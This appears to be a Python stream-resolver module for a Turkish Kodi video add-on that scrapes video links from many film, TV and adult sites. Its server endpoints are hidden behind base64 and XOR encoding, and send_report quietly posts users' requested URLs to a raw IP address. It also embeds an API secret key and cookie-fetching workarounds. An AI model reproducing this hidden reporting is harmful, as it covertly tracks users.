# -*- coding: utf-8 -*-
# version="105"
try:
    from .common import *
except:
    from common import *

videolist = []
qualitylist = []
linkler = []
kaynaklar = []

cid = "X2dhXzhFOUQyVFNUTFg9R1MxLjEuMTcyODY2NjExNi44LjAuMTcyODY2NjExNy4wLjAuMDsgWC1Ub2tlbj1SVE5rV1VwVmVGbDBUblpxWjBoUmJpdFdTelpCYUhFMU4zVndlVUl6Y2pNMk5FNHdaMHR0Y1RreVVUMThWWE5sY201aGJXVWpZbTl5WVc0ME5ETXlma2xRSXpNeExqSXlNeTR6TVM0eU1UWiUyQlJYaHdhWEpsVkdsamF5TTJNemczTURFNU1qTTJPVGt6TXpNME1UTiUyQlZHbGphM01qTmpNNE5qZzJPVEl6TmprNU16TXpOREV6Ow=="
get_alt = "AAAARhA1NjlkAAoMGxExAzsqPwwXAlwkPSJ0HwwXAk8="
hash_ = "aHR0cDovL2FwcC5jZWtrZS5zaXRlOjIwNTIvZGVjb2Rl"
hash__ = "aHR0cDovLzE4NS4xMTYuMjM4LjE2OTo1MDAwL3JlcG9ydF9lcnJvcg=="
hash___ = "aHR0cDovLzE4NS4xMTYuMjM4LjE2OTo0NDQ0L3N0b3Jl"
hash____ = "GxENGUh7emNzRktIWER6Z2FzXVRPUEhjYmV8XAYWBhk9MCE="
def encrypt_message(message, key):
    encrypted_message = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(message))
    return base64.b64encode(encrypted_message.encode()).decode()

def decrypt_message(encrypted_message):
    encrypted_message = base64.b64decode(encrypted_message.encode()).decode()
    decrypted_message = ''.join(chr(ord(c) ^ ord(vidName[i % len(vidName)])) for i, c in enumerate(encrypted_message))
    return decrypted_message

def fixsub(sub, site = None):
    if site == "contentx":
        ff = sub
        vvv = codecs.open(translatepath(os.path.join(DATA_PATH,"okey.vtt")), "w+", "utf-8")
        vvv.write(ff)
        vvv.close()
        return os.path.join(DATA_PATH,"okey.vtt")        
    try:
        if site == None:
            ff = fetch(sub)
        else:
            ff = fetch(sub, head = {"Referer": site})
        ff = re.sub('(\d+:\d+\.\d*) --> (\d+:\d+\.\d*)',r'00:\1 --> 00:\2',ff) 
        vvv = codecs.open(translatepath(os.path.join(DATA_PATH,"okey.vtt")), "w+", "utf-8")
        vvv.write(ff)
        vvv.close()
        return os.path.join(DATA_PATH,"okey.vtt")
    except:
        return sub

def contentx_local_m3u8(page, site = None):
    try:
        vvv = codecs.open(translatepath(os.path.join(DATA_PATH,"okey.m3u8")), "w+", "utf-8")
        vvv.write(page)
        vvv.close()
        return os.path.join(DATA_PATH,"okey.m3u8")
    except:
        pass

def select(kaynaklar, linkler, tip = 2):
    isTv = xbmcgui.Window(10000).getProperty('isTv')
    user_id = 0
    try:
        user_id = int(secure( "user_id" ))
    except: 
        pass
    kaynk = ""
    try:
        kaynk = secure("autoplay_last_subsource")
    except:
        pass

    if kaynk != "" and isTv == "1":
        try:
            link = linkler[kaynaklar.index(kaynk)]
            showMessage(kaynk, 'seçili alt kaynağınızdır.', 2000)
            return (link)
        except:
            pass
        
    name = 'Kalite'
    if tip == 1:
        name = 'Kaynak'
    dialog = xbmcgui.Dialog()
    ret = dialog.select('Lütfen ' + name + ' Seçiniz...',kaynaklar)
    if ret > -1 :
        if user_id != 0:
            secure("autoplay_last_subsource", kaynaklar[ret])
        return linkler[ret]
    else:
        return 'selection cancelled'
    
def check_response_code(link, head={}):
    if "contentx" in link:
        head = {"Referer": "https://contentx.me/"}
    if "vidmoly" in link:
        link = link.split("#")[0]
        head = {"Referer": "https://vidmoly.me/"}
    try: code = requests.head(link, headers=head).status_code
    except: code = 403
    if (code == 200 or code == 301 or code == 307 or code == 308  or code == 206  or  code == 304) :
        return True
    else:
        return False
                
def auto_select(kaynaklar, linkler, sources = None):
    if sources == None: sources = ["2160p","1080p","720p","480p","360p","240p","144p"]
    url = ""
    for source in sources:
        try:
            if "1080p" in sources or "1080" in sources:
                crc = True
            else: crc = check_response_code(linkler[kaynaklar.index(source)])
            if crc :
                url = linkler[kaynaklar.index(source)]
                break
        except:pass
    if url == "":
        url = select(kaynaklar, linkler, 1)
    return url

def findRealChar(c):
    if c.isalpha():
        x = c.lower()
        if x < 'n':
            x = 13
        else:
            x = -13
        return chr(ord(c) + x)
    else:
        return c
    
def myUnpacker(s, e):
    s = s.split("|")
    a = [
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", 
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", 
        "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z" ]

    e = e.split("\\\\")[1:]
    link = ""
    for e1 in e:
        x = a.index(e1)
        link += s[x].strip()[1:]
    return(link)

def detect(source):
    global beginstr
    global endstr
    beginstr = ""
    endstr = ""
    begin_offset = -1
    """Detects whether `source` is P.A.C.K.E.R. coded."""
    mystr = re.search(
        "eval[ ]*\([ ]*function[ ]*\([ ]*p[ ]*,[ ]*a[ ]*,[ ]*c["
        " ]*,[ ]*k[ ]*,[ ]*e[ ]*,[ ]*",
        source,
    )
    if mystr:
        begin_offset = mystr.start()
        beginstr = source[:begin_offset]
    if begin_offset != -1:
        """ Find endstr"""
        source_end = source[begin_offset:]
        if source_end.split("')))", 1)[0] == source_end:
            try:
                endstr = source_end.split("}))", 1)[1]
            except IndexError:
                endstr = ""
        else:
            endstr = source_end.split("')))", 1)[1]
    return mystr is not None

def unpack(source):
    """Unpacks P.A.C.K.E.R. packed js code."""
    payload, symtab, radix, count = _filterargs(source)

    if count != len(symtab):
        raise UnpackingError("Malformed p.a.c.k.e.r. symtab.")

    try:
        unbase = Unbaser(radix)
    except TypeError:
        raise UnpackingError("Unknown p.a.c.k.e.r. encoding.")

    def lookup(match):
        """Look up symbols in the synthetic symtab."""
        word = match.group(0)
        return symtab[unbase(word)] or word

    payload = payload.replace("\\\\", "\\").replace("\\'", "'")
    if sys.version_info.major == 2:
        source = re.sub(r"\b\w+\b", lookup, payload)
    else:
        source = re.sub(r"\b\w+\b", lookup, payload, flags=re.ASCII)
    return _replacestrings(source)


def _filterargs(source):
    """Juice from a source file the four args needed by decoder."""
    juicers = [
        (r"}\('(.*)', *(\d+|\[\]), *(\d+), *'(.*)'\.split\('\|'\), *(\d+), *(.*)\)\)"),
        (r"}\('(.*)', *(\d+|\[\]), *(\d+), *'(.*)'\.split\('\|'\)"),
    ]
    for juicer in juicers:
        args = re.search(juicer, source, re.DOTALL)
        if args:
            a = args.groups()
            if a[1] == "[]":
                a = list(a)
                a[1] = 62
                a = tuple(a)
            try:
                return a[0], a[3].split("|"), int(a[1]), int(a[2])
            except ValueError:
                raise UnpackingError("Corrupted p.a.c.k.e.r. data.")

    raise UnpackingError(
        "Could not make sense of p.a.c.k.e.r data (unexpected code structure)"
    )


def _replacestrings(source):
    global beginstr
    global endstr
    """Strip string lookup table (list) and replace values in source."""
    match = re.search(r'var *(_\w+)\=\["(.*?)"\];', source, re.DOTALL)

    if match:
        varname, strings = match.groups()
        startpoint = len(match.group(0))
        lookup = strings.split('","')
        variable = "%s[%%d]" % varname
        for index, value in enumerate(lookup):
            source = source.replace(variable % index, '"%s"' % value)
        return source[startpoint:]
    return beginstr + source + endstr


class Unbaser(object):
    """Functor for a given base. Will efficiently convert
    strings to natural numbers."""

    ALPHABET = {
        62: "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
        95: (
            " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
        ),
    }

    def __init__(self, base):
        self.base = base

        if 36 < base < 62:
            if not hasattr(self.ALPHABET, self.ALPHABET[62][:base]):
                self.ALPHABET[base] = self.ALPHABET[62][:base]
        if 2 <= base <= 36:
            self.unbase = lambda string: int(string, base)
        else:
            try:
                self.dictionary = dict(
                    (cipher, index) for index, cipher in enumerate(self.ALPHABET[base])
                )
            except KeyError:
                raise TypeError("Unsupported base encoding.")

            self.unbase = self._dictunbaser

    def __call__(self, string):
        return self.unbase(string)

    def _dictunbaser(self, string):
        """Decodes a  value to an integer."""
        ret = 0
        for index, cipher in enumerate(string[::-1]):
            ret += (self.base ** index) * self.dictionary[cipher]
        return ret
    
def send_report(url):
        try:
            requests.post(decode_base64(hash__), data = {"url": url}).text
        except Exception as e:
            pass     

def parse(url):
    original_url = url
    options = {"sinemaizle": mavifilm, "#mavifilm3": filmizlesene, "#mavifilm": mavifilm, "filese.me": filese, "diziwatch": diziwatch, "filmmax": filmmax, "//four": contentx, "contentx.me": contentx, "pichive": contentx, "hotlinger": contentx, "fullhdfilmizlesene": fullhdfilmizlesene, "fullhdfilm": fullhdfilm, "hdfilmizle":hdfilmizle, "playru.net":contentx, "ok.ru/videoembed": okru, "odnoklassniki.ru": okru, "canlidizi": canlidizi, "diziplus": diziplus,"vidmoly": vidmoly,"flmplayer": vidmoly,"vidloadxxxxxxxxxxx": videoone, "closeload": closeload, "diziyou": diziyou, "dizifin": dizifin, "canlitvulusal": canlitvulusal, "diziberlin": diziplus,
               "watchomovies": watchomovies, "streamoupload": streamoupload, "xhamster": xhamster, "xnxx": xnxx, "cnbce":cnbce, "hdfilmcehennemiboncuk45": setfilmizle,"vidmody": vidmody,
               "filmmakinesi": filmmakinesi,"canlitvlive": canlitvlive,"uptostream": uptostream,"youtube": youtube,"filmmodu": filmmodu,"mail.ru": mailru, "streamimdb":streamimdb,
               "fembed": fembed, "feurl": fembed , "femax": fembed ,"fplay": fembed,"dutrag": fembed, "vanfem": fembed, "imdb": imdb,"s1cdn": s1cdn,"showtv.com": show, "showturk.com.tr": show, "showmax.com.tr": show,
               "yjco.xyz": yjco,"nowtv.com.tr": nowtv,"startv.com": startv,"ahaber.com.tr": ahaber, "apara": ahaber, "anews.com.tr": ahaber, "wikiflix": wikiflix,"filmizlemek": filmizlemek,
               "aspor.com.tr": ahaber, "a2tv": ahaber,"atv.com.tr/canli-yayin": atvcanli, "atv.com.tr": atv, "atv.json": atv,"dailymotion": dailymotion,"fileru": fileru,
               "kanald.com": kanald, "kanald.json": kanald,"dizibox": dizibox,"dizilab": dizilab,"chefkoch24.eu": chefkoch24,"haberturk.com": haberturk, "filmkovasi": filmkovasi,
               "bloomberght.com": haberturk,"dha.com": dha,"tlctv.com": tlc, "dmax.com": tlc,"milyontv.com": milyontv, "minikacocuk": atvcanli, "minikago": atvcanli,  "666filmizle": altiyuz,
               "dizitime": dizitime,"videobin.co": videobin,"gounlimited.to": gounlimited,"saruch.co": saruch,"yabancidizi": yabancidizi, "streamruby": streamruby,
               "streamtheworld.com": streamtheworld,"chaturbate.com": chaturbate,"volo.com": volotv,"cnnturk.com": cnnteve2,"4kfilmizle": k4filmizle, "canlitv.ws": canlitvws,
               "teve2.com.tr/canli-yayin": cnnteve2,"tv2.com.tr/diziler": teve2,"kanal7.com/dizi": kanal7dizi,"kanal7.com/ozel-haber": kanal7dizi,"kanal7.com/canli-yayin": kanal7,
               "halktv.com.tr": halktv, "tv100.com": halktv,"kralmuzik.com.tr": kralmuzik,"numberone.com.tr": numberone, "filmatek": filmatek, "dizipal": dizipal,
               "tv360.com.tr": tv360, "m.star.com.tr/video/canli.asp": tv360,"ucankus.com": ucankus,"dreamturk.com.tr": dreamturk, "trt1": trtparser, "setfilmizle": setfilmizle,
               "tvem.com.tr": tvem,"ulusal.com.tr": ulusal,"kanalb.com.tr": kanalb,"ekoturk.com": ekoturk,"dood":dood, "vidply": dood, "vk.com": vkcom, "pokitv": pokitv, 
               "womantv.com.tr": womantv, "tjk.org": tjk,"yabantv.com": yaban, "koytv.tv": yaban,"canliradyolar.org": canliradyolar,"ashemaletube.com": ashemale, "oneupload": oneupload,
               "pornhub.com": pornhub,"clipwatching.com": mixdrop,"xvideos.com": xvideos,"puhutv.com": puh,"mixdrop": mixdrop, "streamhub": mixdrop, "yoltv": yoltv, "vudeo": vudeo,
               "radyohome.com": radyohome,"onlineradiobox.com": onlineradiobox,"tv8.com.tr": tv8,"streamtape.com": streamtape,"7dak": dak7, "filmcidayi": filmcidayi,
               "unlockxh1.com": xhamster, "xhamster.com": xhamster,"dizilla": dizilla_last, "dizipub": dizilla_last,"dizigom": dizigom, "voe.": voe, "brookethoughi":voe,"ntv.com.tr": startv,
               "koreanturk": koreanturk,"unutulmazfilmler": dizilla_last,"canlitv":canlitvcenter, "luluvdo": mixdrop, "figeterpiazine": voe,"maxfinishseveral": voe, "hdabla":hdabla, "dizist": dizilla_last,
               "ugurfilm": ugurfilm,"hdfilmcehennemisyrtrk": hdfilmcehennemisyrtrk, "hdfilmcehennemi": hdfilmcehennemi, "vidlop": vidlop, "streamplayer": streamplayer,
               "webteizle": webteizle,"yilmaztv.com": yilmaztv,"k2s.cc": k2s,"vcdn.io": vcdn, "hdmom":hdmom, "govids": govids, "sibnet": sibnet, "vectorx": vectorx,
               "#sinefil": dizilla_last,"cloudvideo": cloudvideo,"jetfilmizle": jetfilmizle,"plus4.asp": plus4,"sezonlukdizi": sezonlukdizi, "setplayyyy": govids,
               "upstream.to": upstream,"streamsb": sbembed, "filemoon": upstream, "vtube": upstream, "videoseyred": videoseyred,"tele1": tele1,"ulketv": ulketv,"tvnet": tvnet,"sinefy":sinefy,
               "freeomovie": pandamovie_freeomovie,"pandamovie": pandamovie_freeomovie,"diziroll":dizilla_last,"fullfilmizlede": filmizlesene,"streamz": streamz,
               "diziyo": diziyo,"yabanci-dizi": dizilla_last,"meteorolojitv": meteor,"onlinedizi": onlinedizi,"sbembed": sbembed, "liderfilm": liderfilm, "dizirella": dizirella,
               "hdtoday": hdtoday, "streamlare": streamlare, "slwatch":streamlare, "sinemafilmizle":sinemafilmizle, "filmon": filmon, "dizibal":dizibal,
               "dizimom": dizimom, "suhiaza": fembed, "beyaztv": beyaztv, "yirmidort.tv": yirmidort, "siyahfilmizle": siyahfilmizle, "filmekseni": filmekseni,
               "watch-free": hdtoday, "radyodelisi": radyodelisi, "vidoza.net/embed":vidoza, "videzz.net":vidoza,"https://s.to": sto, "aniworld": sto, "filelions": mixdrop,
               "dooood.com": dood, "streamwish": streamwish, "cinemathek": cinemathek, "supervideo": mixdrop, "movie4k": movie4k, "youporn": youporn, "sobreatsesuyp": trstx,
               "goodstream": goodstream, "dropload": mixdrop, "vimeo": vimeo, "trstx": trstx, "teleontv.at": teleontv, "lookmovie2": lookmovie2,"sozcu": sozcu,
               "roketdizi": dizilla_last, "themoviearchive": hdtoday, "thehun.net": thehun, "istanbuluseyret": istanbuluseyret, "dizimia": dizilla_last, "sinema": sinemacx,
               "vumoo": hdtoday, "149.255.152.218/channels": myvideoaz, "parsatv":parsatv,"ddizi": ddizi, "allclassic": allclassic,"dizipod": dizipod, "www.pornpics": pornpics}
       
    if  url is not None:
        if 'selection cancelled' not in url:
            for key in options.keys():
                if key in url:
                    try:
                        url = options[key](url)
                        if not url:
                            threading.Thread(target=send_report, args=(original_url,), daemon=True).start()
                    except:
                        threading.Thread(target=send_report, args=(original_url,), daemon=True).start()
                        url = None
                    if url is not None:
                        if 'selection cancelled' not in url:
                            secondary_url = url
                            if  ('dailymotion.com/video' in url or ("vidload.one" in url and "playlist" not in url) or "streamlare.com/e" in url or"sbembed" in url or "vidlop" in url or "streamplayer" in url or
                                 ('protonvideo' in url and 'index.m3u8' not in url) or 'mixdrop' in url or "vidoza.net/embed" in url or "videzz.net/embed" in url or
                                 ('dood' in url and "Referer" not in url) or 'voe.' in url or "vk.com" in url or "figeterpiazine" in url or "brookethoughi" in url or
                                 ('streamtape' in url and 'get_video?id' not in url )or ('videoseyred' in url and 'Referer' not in url)  or ("sibnet" in url and "/v/" not in url) or
                                 'fplay' in url or 'dutrag' in url or 'flmplayer' in url or 'plus4' in url or 'filese.me/iframe' in url or ("vectorx" in url and "Referer" not in url) or
                                 'videobin.co/embed' in url or 'vcdn.io' in url or 'mixdrop' in url or 'cloudvideo' in url  or ("govids" in url and "redirect" not in url) or ("setplay" in url and "redirect" not in url) or
                                 'contentx.me/iframe' in url or 'contentx.me/multiplayer' in url or "playru.net/multiplayer" in url  or "playru.net/iframe" in url  or
                                 'dailymotion.com/embed' in url or 'youtube.com/embed' in url or ("streamoupload" in url and "embed" in url) or ("oneupload" in url and "master" not in url) or
                                 ('youtube.com/watch' in url and "diyetim" not in url)  or ('gounlimited' in url and 'v.mp4' not in url) or "dooood.com" in url or ("vudeo" in url and "Referer" not in url) or
                                 ('upstream.to' in url and 'Referer' not in url) or ("vidmoly" in url and 'Referer' not in url) or ("streamruby" in url and "Referer" not in url) or
                                 ("closeload" in url and 'Referer' not in url) or ("odnoklassniki.ru" in url and 'Referer' not in url) or ("sobreatsesuyp" in url  and "/stream" not in url) or
                                 ("ok.ru" in url and 'Referer' not in url) or ("streamsb" in url and 'Referer' not in url) or ("trstx" in url and "/stream" not in url) or
                                 ("mail.ru" in url and 'Referer' not in url) or ("fembed" in url and 'Referer' not in url) or "streamwish" in url or ("allclassic" in url and "get_file" not in url) or
                                 "filelions" in url or "supervideo" in url or ("goodstream" in url and "download_token" not in url) or ("dropload" in url and ".m3u8" not in url) or
                                 'hotlinger.com/iframe' in url or 'hotlinger.com/multiplayer' in url or "filemoon" in url or 'pichive.online/iframe' in url or 'pichive.online/multiplayer' in url or 
                                 ("//four" in url and "iframe" in url) or ("/four" in url and "multiplayer" not in url)) :
                                 url = parse(url)
                                 if not url:
                                     threading.Thread(target=send_report, args=(secondary_url,), daemon=True).start()
                    break

    return url

def normalize_url(url: str) -> str:
    from urllib.parse import urlunparse as Urlunparse
    url = 'http:' + url if url.startswith('//') else 'http://' + url if not url.startswith(('http://', 'https://')) else url
    return Urlunparse(Urlparse(url)._replace(scheme='https'))

def play_youtube(url):
    video_id = re.findall('(?:v=|embed\/)(.*?)(?:&|$)',url)[0]
    import xbmc
    youtube_url = f"plugin://plugin.video.youtube/play/?video_id={video_id}&play_mode=1"
    xbmc.executebuiltin(f"RunPlugin({youtube_url})")


def youtube(url):
    showMessage("seyirTURK", "Youtube linkleri çalışmamaktadır.")
    # resp = requests.post("http://127.0.0.1:5000/resolve", json={"url":"https://www.youtube.com/watch?v=_9AhL2piqzg"})
    # link = resp.json()
    # return link.get("play_url")
    # if "youtubeiptvs" in url:
    #     kanallar = url.split("#")
    #     url = kanallar[0]
    #     kanal_no = int(kanallar[1])
    #     page = fetch(url.replace("youtubeiptvs", "https://www.youtube.com"))
    #     url = "https://www.youtube.com/watch?v=" + re.findall('LIVE.*?"addedVideoId":"(.*?)","', page)[kanal_no]
    #     url = url.replace('https://www.youtube.com/embed/','https://www.youtube.com/watch?v=')
    # html = fetch(url)
    # html = html.replace('\\','')
    # if 'm3u8' in html:
    #     link = re.findall('"(http[^"]+m3u8)"', html, re.IGNORECASE)[0]
    #     page = fetch(link)
    #     url_main = '/'.join(link.split('/')[:-1]) + '/'
    #     page1 = fetch(url_main)
    #     qualitylist = re.findall(',RESOLUTION=.*?x([0-9]+)', page1)
    #     videolist= re.findall('(https.*?m3u8)', page1)
    #     return videolist[-1:][0] + "#User-Agent=" + UA + "&Referer=https://www.youtube.com/"
    # else:
        # link = None
        # post_url = "https://www.clipto.com/api/youtube"
        # v_id = re.findall('(?:v=|embed\/)(.*?)(?:&|$)',url)[0]
        # data = {"url": url}
        # headers = {"User-Agent": UA, "Referer": baseUrl(post_url)}
        # js = requests.post(post_url, json = data, headers = headers).json()
        # for link in js["medias"]:
        #     if "720p" in link['quality']:
        #         link =link["url"]
        #         break
        # return link

def vkcom(url):    
    temp = "https://vk.com/al_video.php?act=show"
    data = requests.post(temp, data = "act=show&al=1&claim=&dmcah=&hd=&list=&module=direct&playlist_id=" + url.split("video")[1].split("_")[0] + "_-2&show_original=&t=&video="+url.split("video")[1], 
                         headers = {"User-Agent": UA, "Referer": url, "X-requested-with": "XMLHttpRequest"}).text
    js = json.loads(data)
    link = js["payload"][1][4]["player"]["params"][0]["hls"]
    return link

def uptostream(url):
    html = fetch(url)
    base = re.findall("window\.sources = JSON\.parse\(atob\('(.*?)'",html)
    acik_base = decode_base64(base[0])
    try:
        for i in re.finditer('"src":"([^"]+)","type":"[^"]+","label":"([^"]+)"', acik_base):
            qualitylist.append(i.group(2))
            videolist.append(i.group(1).replace('\\', ''))
    except:
        for i in re.finditer('source src=[\'|"](.*?)[\'|"].*?data-res=[\'|"](.*?)[\'|"]', acik_base):
            qualitylist.append(i.group(2))
            videolist.append('http:' + i.group(1))
    if not qualitylist:
        error(url)
    else:
        return select(qualitylist,videolist)
    
def canlitvlive(url):
    html = fetch(url)
    link = re.findall("player.src\('(.*?)'", html) 
    header = '#Referer='+url+'&User-Agent=' + UA
    return link[0] + header
    
def closeload(url):
    html = fetch(url, head={'Referer': url, 'Origin': url})
    Header = '#Referer='+url+'&User-Agent=' + UA +'&Origin=' + url
    link = re.findall('"contentUrl": "([^"]+)"', html)
    subtitles = re.findall('track src="(/vtt.*?)"',html)
    son = link[0] + Header
    if len(subtitles)>0:
        altyazilar = []
        for subtitle in subtitles:
            altyazilar.append('https://closeload.com' + subtitle)
        return [son, altyazilar]
    else:
        return son

def vidmoly(url):
    if "flmplayer" in url:
       req = Request(url, headers={ 'User-agent': UA})
       html = urlopen(req)
       html1 = html.read()
       content = html1
       url = html.geturl()
    else:
       url =  url.replace("http:","")
       url =  url.replace("https:","")
       url= 'https:' + url.replace('.top','.to')
       content = requests.get(url, headers = {"User-Agent": UA, "sec-fetch-dest":"iframe"}, allow_redirects=True).text
    try:
        window = re.findall("window.location\s*=\s*'(.*?)'",content)[0]
        url = url.replace('embed-',window)
        try:
            content = fetch(url)
        except:
            url = url.replace('.me','.to')
            content = fetch(url,head={'Referer': url})
    except:
        pass
    m3u8link = re.findall("([^']+\.m3u8.*?)'",content)
    qualitylist = re.findall(',\s*label:\s*"(.*?)"',content)
    subtitles = re.findall("file\s*:\s*'([^']+/srt.*?)'",content)
    link = m3u8link[0] + '#Referer=https://vidmoly.to/'
    return [link,subtitles]

def vidmoly_old(url):
    videolist1 = []
    if "flmplayer" in url:
       req = Request(url, headers={ 'User-agent': UA})
       html = urlopen(req)
       html1 = html.read()
       content = html1
       url = html.geturl()
    else:
       url =  url.replace("http:","")
       url =  url.replace("https:","")
       url= 'https:' + url.replace('.top','.to')
       content = requests.get(url, headers = {"User-Agent": UA, "sec-fetch-dest":"iframe"}, allow_redirects=True).text
    try:
        window = re.findall("window.location\s*=\s*'(.*?)'",content)[0]
        url = url.replace('embed-',window)
        try:
            content = fetch(url)
        except:
            url = url.replace('.me','.to')
            content = fetch(url,head={'Referer': url})
    except:
        pass
    m3u8link = re.findall('([^"]+\.m3u8)',content)
    videolist = re.findall('([^"]+\.mp4)',content)
    qualitylist = re.findall(',label:"(.*?)"',content)
    subtitle = re.findall('file\s*:\s*"(/srt.*?)"',content)
    try:
        if qualitylist :
           for i in videolist:
               videolist1.append(i + '#Referer=https://vidmoly.to/')
        else:
           videolist1.append(videolist[0] + '#Referer=https://vidmoly.to/')
           qualitylist.append('mp4')
    except:
        pass
    try:
       videolist1.append(m3u8link[0] + '#Referer=https://vidmoly.to/')
       qualitylist.append('m3u8')
    except:
       pass
    if len(subtitle)>0:
        res = auto_select(qualitylist,videolist1,["m3u8", "mp4"])
        if res is not None:
            for sub in subtitle:
                su = subtitle[0]
                if "Turkish" in sub:
                    su = fixsub('http://vidmoly.to' +sub)
            return [res, [su]]
    elif len(qualitylist)>1:
        return auto_select(qualitylist,videolist1["m3u8", "mp4"])
    elif len(qualitylist) == 1:
        return videolist1[0]
    
def okru(url):
    url =  url.replace("http:","")
    url =  url.replace("https:","")
    url = 'https:' + url
    id1 = re.findall('https?://(?:www.)?(?:odnoklassniki|ok).ru/(?:videoembed/|dk\\?cmd=videoPlayerMetadata&mid=)(\\d+)', url)[0]
    url = "http://www.ok.ru/dk"
    data = {'cmd': 'videoPlayerMetadata', 'mid': id1}
    page = fetch(url, data=data, head = {"UserAgent": UA})
    link = re.findall('(?:ultra|quad|full|hd|sd|low|lowest)","url":"(.*?)"',page)[0].replace(r"\u0026","&") + '#Referer=https://ok.ru/' + "&UserAgent=" + UA
    return link
    
def filmmodu(url):
    kok = '/'.join(url.split('/')[:3])
    html = fetch(url)
    srcs = re.findall('"src"\s*:\s*"(.*?)"',html)
    qualitylist =["1080","720","480"]
    for o in qualitylist:
        for vid in srcs:
            if o in vid:
                videolist.append(vid.replace("\\", ""))
    try:
        subtitle = re.findall('"subtitle"\s*:\s*"(.*?)"',html)[0]
        subtitle1 = kok + subtitle
    except:
        subtitle1 = ''
    res = auto_select(qualitylist,videolist)
    if res is not None:
        return [res,[subtitle1]]
    
def mailru(url):
    code = fetch(url)
    meta = re.findall('(?:metadataUrl|metaUrl)":.*?(//my[^"]+)', code)
    if meta:
        url2 = 'https:%s?ver=0.2.123' % meta[0]
        page = fetch(url2)
        key = re.findall('video_key[^;]+', page)
        if key:
            for match in re.finditer('url":"(//cdn[^"]+).+?(\\d+p)', page):
                videolist.append('http:' + match.group(1) + '#Referer=' + url + '&User-Agent=' + UA + '&Cookie=' + key[0])
                qualitylist.append(match.group(2))
        if len(qualitylist) > 1:
            try:
                ind = qualitylist.index("1080p")
            except:
                try:
                    ind = qualitylist.index("720p")
                except:
                    try:
                        ind = qualitylist.index("480p")
                    except:
                        ind = qualitylist.index("360p")
            return videolist[ind]
        else:
            return videolist[0]
    
def fembed(url):
    kok = '/'.join(url.split('/')[:3])
    url = fetch(url, head= {'Referer': url, 'Use-Agent': 'Mozilla'}, redir = 1)
    dat = {}
    url = url.replace('/v/','/api/source/')
    dt = re.findall('(?:http://|//)(.*?)/', url)[0]
    dat["r"] = ''
    dat["d"] = dt
    html = fetch(url, data=dat, head={'Referer': url})
    html = html.replace('\\','')
    for match in re.finditer('"file":"([^"]+)","label":"([^"]+)"', html):
        qualitylist.append(match.group(2))
        videolist.append(match.group(1))
    if len(qualitylist) > 1:
        try:
            ind = qualitylist.index("1080pff")
        except:
            try:
                ind = qualitylist.index("720pff")
            except:
                ind = qualitylist.index("480p")
        return videolist[ind]
    else:
        return videolist[0] + "#Referer=" + kok + "&User-Agent=" + UA

def imdb(url):
    id = url.split("/")[-1]
    
    def requem(url, cookies):
        r = requests.get(
            url,
            cookies=cookies,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        )
        if r.status_code == 403 or r.status_code == 202:
            cookies = requests.get(decrypt_message(hash____) + "/refresh").json()["cookies"]

            r = requests.get(
                url,
                cookies=cookies,
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
            )
        return r.text, cookies
    cookies = requests.get(decrypt_message(hash____)).json()["cookies"]   
    page, cookies = requem("https://www.imdb.com/title/" + id +"/", cookies=cookies)

    vi = re.findall(r'(/video/vi\d+)', page)
    page, cookies = requem("https://www.imdb.com" + vi[0], cookies=cookies)
    raw = re.findall(r'"url"\s*:\s*"(https:[^"]+\.m3u8[^"]*)"', page)[0]
    m3u8 = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), raw)
    m3u8 = m3u8.replace("\\/", "/")
    return m3u8


        
def s1cdn(url):
    page = fetch(url)
    base = re.findall('"#2(.*?)"',page)
    return decode_base64(re.sub('(//.*?=)','',base[0]))

def show(url):
    page= requests.get(url).text
    if "showturk" in url or "showmax" in url:    
        js = json.loads(re.findall(" data-hope-video='(.*?)'", page)[0])
        link = js["media"]["m3u8"][0]["src"]
        return link
    if "showtv.com" in url: 
        return re.findall('var\s*videoUrl\s*=\s*"(.*?)"', page)[0]
    
def yjco(url):
    page = fetch(url)
    a = re.findall('"file".*?:.*?"(.*?)".*?,.*?"label".*?:.*?"(.*?)"',page)
    for i in a:
        qualitylist.append(i[1])
        videolist.append(i[0])
    return select(qualitylist,videolist)
    
def nowtv(url):
    page = fetch(url)
    if not 'canli-yayin' in url:
        b = re.findall("source\s*:\s*'(.*?)'", page)
        return b[0]
    else:
        return re.findall("(?:videoSrc|daiUrl)\s*:\s*'(.*?)'", page)[0]
    
def startv(url):
    if 'canli-yayin' in url:
        page1 = fetch("https://dyg-ads-cdn.s3.eu-west-1.amazonaws.com/live-broadcast-player/v1/bundle.js")
        if "startv" in url:
            link = re.findall('Startv.*?development":"(.*?)"',page1)
        elif "ntv.com" in url:
            link = re.findall('Ntv.*?development":"(.*?)"',page1)
        return link[0]
    else:
        a = requests.get(url).text
        c = re.findall('<meta property="dyg:tags" content="(.*?)"/>',a)
        page = requests.get("https://dygvideo.dygdigital.com/api/video_info?akamai=true&PublisherId=1&ReferenceId=StarTv_" + c[0].split(",")[2] + "&SecretKey=NtvApiSecret2014*", headers = {"User-Agent": UA, "Referer": url}).text
        j = json.loads(page)
        link = j["data"]["flavors"]["0"]["file_url_1"]
        return link + "#User-Agent=" + UA + "&Referer=" + url
        
    
def atv(url):
    headers = {'Referer':'https://www.atv.com.tr/','User-Agent': UA}
    data44 = fetch(url, head = headers)
    m1 = re.findall('videoid="(.*?)" data-vp="tmdvpcontainer" data-websiteid="(.*?)"', data44)
    url44 = "https://videojs.tmgrup.com.tr/getvideo/" + m1[0][1] + "/" + m1[0][0]
    data = requests.get(url44, headers = headers).text
    url2, url1 = re.findall('"VideoUrl"\s*:\s*"([^"]+)".*?"VideoSmilUrl"\s*:\s*"([^"]+)"', data, re.IGNORECASE)[0]
